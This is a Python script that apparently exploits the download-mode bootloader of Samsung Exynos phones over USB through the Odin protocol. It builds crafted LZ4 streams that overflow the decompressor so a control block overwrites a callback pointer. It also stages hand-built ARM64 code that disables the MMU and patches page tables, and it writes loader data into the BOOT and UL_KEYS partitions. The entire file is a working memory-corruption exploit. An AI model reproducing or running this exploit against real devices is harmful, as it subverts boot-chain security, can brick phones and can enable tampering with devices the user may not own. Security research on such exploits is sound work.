#!/usr/bin/env python3
import argparse
import hashlib
import struct
import sys
import time
from pathlib import Path

import usb.core
import usb.util
from usb.backend import libusb1

sys.dont_write_bytecode = True

from offsets import (
    BLOCK,
    CB_OFF,
    CODE_ADDR,
    CODE_MAX,
    CODE_OFF,
    CODE_STORE_ADDR,
    CODE_SLOT,
    CONTEXT_ADDR,
    CONTEXT_RESTORE,
    CTL_LEN,
    MMU_DISABLE,
    MMU_ENABLE,
    OUT_BASE,
    PACK_ADDR,
    PACK_MAX,
    PACK_SLOT,
    PAR_SLOT,
    REPLY_ADDR,
    RESERVE,
    RESULT_OK,
    SOC,
    STACK_ADDR,
    STAGE_ADDR,
    STAGE_STORE_ADDR,
    PTE_ADDR,
    PTE_VALUE,
    WALK_LEN,
    WRITE_ADDR,
)

ROOT = Path(__file__).resolve().parent
PIT_ENT = 0x84


def pkt(op, sub=0, args=()):
    vals = [op, sub, *args]
    return struct.pack("<256I", *(vals + [0] * (256 - len(vals))))


def rx(dev, size, timeout=30000):
    data = bytes(dev.read(0x81, size, timeout=timeout))
    if len(data) != size:
        raise RuntimeError(f"short read {len(data):#x}/{size:#x}")
    return data


def tx(dev, data, timeout=30000):
    if dev.write(0x01, data, timeout=timeout) != len(data):
        raise RuntimeError("short write")


def cmd(dev, op, sub=0, args=(), timeout=30000):
    tx(dev, pkt(op, sub, args), timeout)
    req, ret = struct.unpack("<II", rx(dev, 8, timeout))
    if req != op:
        raise RuntimeError(f"odin {op}:{sub}")
    return ret


def enable_usbdk(backend):
    """Opt this libusb context into the UsbDk backend (Windows).

    Without it libusb only sees devices bound to WinUSB/libusbK; with it the
    stock Samsung driver can stay in place (Odin keeps working).  Returns True
    when the option was accepted.
    """
    try:
        import ctypes
        lib = backend.lib
        lib.libusb_set_option.argtypes = [ctypes.c_void_p, ctypes.c_int]
        # LIBUSB_OPTION_USE_USBDK = 1, must be set right after libusb_init()
        return lib.libusb_set_option(backend.ctx, 1) == 0
    except (AttributeError, OSError):
        return False


def open_usb():
    # Windows has no system libusb: prefer the DLL shipped by libusb-package,
    # fall back to pyusb's own discovery (Linux/macOS).
    try:
        import libusb_package
        backend = libusb1.get_backend(find_library=libusb_package.find_library)
    except ImportError:
        backend = libusb1.get_backend() or None
    if backend is None:
        raise RuntimeError(
            "no libusb backend: pip install libusb-package, or install "
            "libusb-1.0 (Linux) / UsbDk (Windows)")
    enable_usbdk(backend)
    try:
        dev = usb.core.find(idVendor=0x04E8, idProduct=0x685D, backend=backend)
    except usb.core.NoBackendError:
        raise RuntimeError("libusb could not enumerate USB devices")
    if dev is None:
        raise RuntimeError("device not found (is it in download mode?)")
    try:
        dev.set_configuration()
    except usb.core.USBError as exc:
        raise RuntimeError(
            f"cannot set configuration: {exc}; on Windows install UsbDk "
            "(recommended, keeps Odin working) or bind WinUSB with Zadig")
    try:
        if dev.is_kernel_driver_active(1):
            dev.detach_kernel_driver(1)
    except (NotImplementedError, usb.core.USBError):
        pass
    try:
        usb.util.claim_interface(dev, 1)
    except usb.core.USBError as exc:
        raise RuntimeError(
            f"cannot claim interface 1: {exc}; on Windows install UsbDk "
            "(recommended, keeps Odin working) or bind WinUSB to interface 1 "
            "with Zadig")
    return dev


def get_pit(dev):
    size = cmd(dev, 101, 1)
    if not 0x1C <= size <= 0x4000:
        raise RuntimeError(f"PIT size {size:#x}")
    out = bytearray()
    for index, off in enumerate(range(0, size, 500)):
        tx(dev, pkt(101, 2, (index,)))
        out += rx(dev, min(500, size - off))
    return bytes(out)


def part(pit, name):
    if struct.unpack_from("<I", pit)[0] != 0x12349876:
        raise RuntimeError("bad PIT")
    for index in range(struct.unpack_from("<I", pit, 4)[0]):
        off = 0x1C + index * PIT_ENT
        ent = pit[off:off + PIT_ENT]
        if ent[0x24:0x44].split(b"\0", 1)[0] == name:
            return struct.unpack_from("<II", ent, 4)
    raise RuntimeError(f"missing {name.decode()}")


def send_data(dev, size, head=b"", step=BLOCK):
    zero = bytes(step)
    total = (size + step - 1) // step * step
    for off in range(0, total, step):
        block = zero
        if off < len(head):
            block = bytearray(zero)
            n = min(step, len(head) - off)
            block[:n] = head[off:off + n]
        tx(dev, block)
        rx(dev, 8)


def put(dev, size, dst, last, head=b""):
    cmd(dev, 102, 2, (size,))
    send_data(dev, size, head)
    cmd(dev, 102, 3, (0, size, 0, dst[0], dst[1], last))


def put_comp(dev, size, dst, data=None, timeout=30000):
    data = bytes(4) if data is None else data
    if len(data) < size and len(data) != 4:
        raise RuntimeError("short compressed block")
    raw = struct.pack("<I", size | 0x80000000) + data
    cmd(dev, 102, 6, (len(raw),))
    send_data(dev, len(raw), raw, 8)
    return cmd(dev, 102, 7, (0, 8, 0, dst[0], dst[1], 0), timeout)


ZERO_CHUNK = 0x100000


def lz4_zeros(size):
    """Raw LZ4 block (no frame) that decompresses to `size` zero bytes.

    Layout: [token][literal][offset=1][match-ext][token][5 literals]
    which yields 1 + (size-6) + 5 = size bytes, all zero.
    """
    if size < 13:
        raise ValueError("lz4_zeros: block too short")
    code = (size - 6) - 4          # LZ4 stores matchlen - 4
    token = (1 << 4) | min(code, 15)
    out = bytearray([token, 0x00, 0x01, 0x00])  # token, literal, offset
    if code >= 15:
        rest = code - 15
        while rest >= 255:
            out.append(255)
            rest -= 255
        out.append(rest)
    out.append(5 << 4)              # trailing literal run
    out += bytes(5)
    return bytes(out)


def build_packet(target, ctl, base=None):
    """One packet whose decompressed output ends with `ctl` at `target`.

    Returns (stream, total) where total is the uncompressed size the LK
    must be told, and the stream is a chunk list ending in a stored chunk
    carrying the control block at the right offset.
    """
    base = OUT_BASE if base is None else base
    if isinstance(ctl, int):
        ctl = struct.pack("<Q", ctl)
    target_off = target - base
    count = target_off // ZERO_CHUNK + 1
    total = count * ZERO_CHUNK
    ctl_at = target_off - (count - 1) * ZERO_CHUNK
    if not 0 <= ctl_at <= ZERO_CHUNK - len(ctl):
        raise RuntimeError("control block does not fit the final chunk")
    stream = bytearray()
    for index in range(count - 1):
        block = lz4_zeros(ZERO_CHUNK)
        stream += struct.pack("<I", len(block)) + block
    payload = bytearray(ZERO_CHUNK)
    payload[ctl_at:ctl_at + len(ctl)] = ctl
    stream += struct.pack("<I", 0x80000000 | len(payload)) + payload
    return bytes(stream), total


def send_stream(dev, data, step=BLOCK):
    """Send `data` in <=step transfers, padded only to 8 bytes (like put_comp).

    The LK reads exactly the announced length, so over-padding to a whole
    block makes the device stop reading and the next write goes short.
    """
    total = (len(data) + 7) // 8 * 8
    pad = bytes(total - len(data))
    body = data + pad
    for off in range(0, total, step):
        chunk = body[off:off + step]
        tx(dev, chunk)
        rx(dev, 8)


def put_packet(dev, stream, total, dst, timeout=600000, size_arg=None,
               last=0):
    """Send one cumulative packet; the LK decompresses it in one pass."""
    value = total if size_arg is None else size_arg
    cmd(dev, 102, 6, (len(stream),))
    send_stream(dev, stream)
    return cmd(dev, 102, 7, (0, value, 0, dst[0], dst[1], last), timeout)


def load_bundle(path):
    data = path.read_bytes()
    if not 64 <= len(data) <= PACK_MAX:
        raise RuntimeError("bundle size")
    hdr = struct.unpack_from("<IHH6I32s", data)
    if hdr[:4] != (0x42333541, 1, 64, len(data)):
        raise RuntimeError("bundle header")
    if hashlib.sha256(data[64:]).digest() != hdr[-1]:
        raise RuntimeError("bundle hash")
    if RESERVE + len(data) > PAR_SLOT:
        raise RuntimeError("bundle slot")
    return data


def invoke(dev, dst, target, reply, timeout=30000, span=None):
    """Send the control block that lands on the send-callback global.

    span > 8 fills a window of `span` bytes with the target repeated, so a
    small error in where the decompressor's write pointer ends up still
    overwrites the global.
    """
    span = CTL_LEN if span is None else span
    ctl = struct.pack(f"<{span // 8}Q", *([target] * (span // 8)))
    return put_comp(dev, len(ctl), dst, ctl, timeout)


def branch(pc, target, link=False):
    delta = target - pc
    if delta & 3 or not -(1 << 27) <= delta < 1 << 27:
        raise RuntimeError("stage branch")
    return (0x94000000 if link else 0x14000000) | (delta >> 2 & 0x3FFFFFF)


def literal(pc, target, reg):
    delta = target - pc
    if delta & 3 or not -(1 << 20) <= delta < 1 << 20:
        raise RuntimeError("stage literal")
    return 0x58000000 | (delta >> 2 & 0x7FFFF) << 5 | reg


def stage_code():
    lit = STAGE_STORE_ADDR + 0x48
    words = [
        literal(STAGE_STORE_ADDR, lit, 9),
        0xD5087629,
        0xD5033F9F,
        literal(STAGE_STORE_ADDR + 0xC, lit + 8, 10),
        0xF900012A,
        0xD5033F9F,
        0xD508871F,
        0xD5033F9F,
        0xD5033FDF,
        literal(STAGE_STORE_ADDR + 0x24, lit + 16, 30),
        literal(STAGE_STORE_ADDR + 0x28, lit + 24, 16),
        0xD61F0200,
        literal(STAGE_ADDR + 0x30, STAGE_ADDR + 0x68, 0),
        0x52800101,
        branch(STAGE_ADDR + 0x38, CODE_ADDR, True),
        0xD503205F,
        branch(STAGE_ADDR + 0x40, STAGE_ADDR + 0x3C),
        0xD503201F,
    ]
    data = bytearray(struct.pack(f"<{len(words)}I", *words))
    data += struct.pack(
        "<5Q", PTE_ADDR, PTE_VALUE, STAGE_ADDR + 0x30,
        MMU_ENABLE, REPLY_ADDR,
    )
    return bytes(data)


def context():
    data = bytearray(0x110)
    struct.pack_into("<4Q", data, 0xF0, STAGE_STORE_ADDR,
                     STACK_ADDR, MMU_DISABLE, 0x3C5)
    return bytes(data)


def walk(dev, dst, left, done, total, mark, step=None):
    while left:
        size = min(left, step or BLOCK)
        put_comp(dev, size, dst)
        left -= size
        done += size
        if done >= mark or done == total:
            print(f"walk {done:#x}/{total:#x}", flush=True)
            mark = done + 0x4000000
    return done, mark


def run(code_path, bundle_path, walk_len=None, span=None, block=None,
        packet=False, out_base=None, size_arg=None, probe_chunk=False,
        last=0):
    code = code_path.read_bytes()
    bundle = load_bundle(bundle_path)
    if not code or len(code) > CODE_MAX or CODE_OFF + len(code) > 0x1000:
        raise RuntimeError("loader size")
    walk_len = WALK_LEN if walk_len is None else walk_len

    dev = open_usb()
    try:
        print("connect", flush=True)
        tx(dev, b"ODIN")
        if rx(dev, 4) != b"LOKE" or cmd(dev, 100, 0) != 0x00028000:
            raise RuntimeError("handshake")
        cmd(dev, 100, 2, (0x7FFFFFFF,))
        pit = get_pit(dev)
        scratch = part(pit, b"UL_KEYS")
        boot = part(pit, b"BOOT")
        cmd(dev, 100, 5, (BLOCK,))
        cmd(dev, 102, 0)

        print("stage", flush=True)
        reserve = bytearray(RESERVE)
        if CONTEXT_ADDR:
            if CONTEXT_ADDR != PACK_ADDR - RESERVE:
                raise RuntimeError("context address")
            reserve[:0x110] = context()
        for slot in range(CODE_SLOT):
            if slot == PACK_SLOT:
                put(dev, RESERVE + len(bundle), scratch, 0,
                    reserve + bundle)
            else:
                put(dev, 1, scratch, 1)
        staged = bytearray(CODE_OFF + len(code))
        staged[CODE_OFF:] = code
        if STAGE_STORE_ADDR:
            off = CODE_OFF + STAGE_STORE_ADDR - CODE_STORE_ADDR
            transition = stage_code()
            if off < 0 or off + len(transition) > CODE_OFF:
                raise RuntimeError("stage layout")
            staged[off:off + len(transition)] = transition
        put(dev, len(staged), boot, 0, staged)
        put(dev, 1, scratch, 1)

        cmd(dev, 100, 5, (8,))
        cmd(dev, 102, 5)
        if packet:
            target = CONTEXT_RESTORE or CODE_ADDR
            base = OUT_BASE if out_base is None else out_base
            if probe_chunk:
                # first chunk claims > 1MB: the worker's guard prints and
                # spins, proving it parsed our stream at all.
                stream = struct.pack("<I", 0x200000) + bytes(20)  # 24 bytes
                total = 0x200000
            else:
                stream, total = build_packet(WRITE_ADDR, target, base)
            print(f"packet {len(stream):#x} bytes -> {WRITE_ADDR:#x} "
                  f"(total {total:#x})", flush=True)
            start = time.monotonic()
            wait = 20000 if probe_chunk else 180000
            ret = put_packet(dev, stream, total, boot, timeout=wait,
                             size_arg=size_arg, last=last)
            print(f"invoke {time.monotonic() - start:.3f}s -> {ret:#x}",
                  flush=True)
            if ret != RESULT_OK:
                raise RuntimeError(f"loader {ret:#x}")
            return
        walk(dev, scratch, walk_len, 0, walk_len, 0x4000000, block)

        print(f"trigger {WRITE_ADDR + (walk_len - WALK_LEN):#x}", flush=True)
        start = time.monotonic()
        target = CONTEXT_RESTORE or CODE_ADDR
        reply = CONTEXT_ADDR or REPLY_ADDR
        ret = invoke(dev, boot, target, reply, 600000, span)
        took = time.monotonic() - start
        print(f"invoke {took:.3f}s -> {ret:#x}", flush=True)
        if ret != RESULT_OK:
            raise RuntimeError(f"loader {ret:#x}")
        print(f"done {time.monotonic() - start:.1f}s", flush=True)
    finally:
        try:
            usb.util.dispose_resources(dev)
        except usb.core.USBError:
            pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--soc", required=True,
                    choices=("s5e8825", "s5e9925", "s5e9945"))
    ap.add_argument("code", type=Path, nargs="?", default=ROOT / "loader.bin")
    ap.add_argument("--bundle", type=Path, default=ROOT / "loader/bundle.bin")
    ap.add_argument("--walk", type=lambda v: int(v, 0), default=None,
                    help="override WALK_LEN (short walks probe out_base cheaply)")
    ap.add_argument("--span", type=lambda v: int(v, 0), default=None,
                    help="control-block window size; target repeated every 8 bytes")
    ap.add_argument("--block", type=lambda v: int(v, 0), default=None,
                    help="walk block size (one oversized block tests the overflow)")
    ap.add_argument("--packet", action="store_true",
                    help="send one cumulative packet (chunks accumulate)")
    ap.add_argument("--out-base", type=lambda v: int(v, 0), default=None,
                    help="decompression output base for --packet")
    ap.add_argument("--size-arg", type=lambda v: int(v, 0), default=None,
                    help="value for the commit's size argument")
    ap.add_argument("--probe-chunk", action="store_true",
                    help="send a >1MB first chunk: hangs the worker if the "
                         "parser reads our stream")
    ap.add_argument("--last", type=lambda v: int(v, 0), default=0,
                    help="last flag on the commit")
    args = ap.parse_args()
    if args.soc != SOC:
        raise ValueError(f"generated loader is for {SOC}, not {args.soc}")
    if args.span is not None and (args.span < 8 or args.span % 8):
        raise ValueError("--span must be a positive multiple of 8")
    run(args.code.resolve(), args.bundle.resolve(), args.walk, args.span,
        args.block, args.packet, args.out_base, args.size_arg,
        args.probe_chunk, args.last)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:
        raise SystemExit(f"error: {exc}")
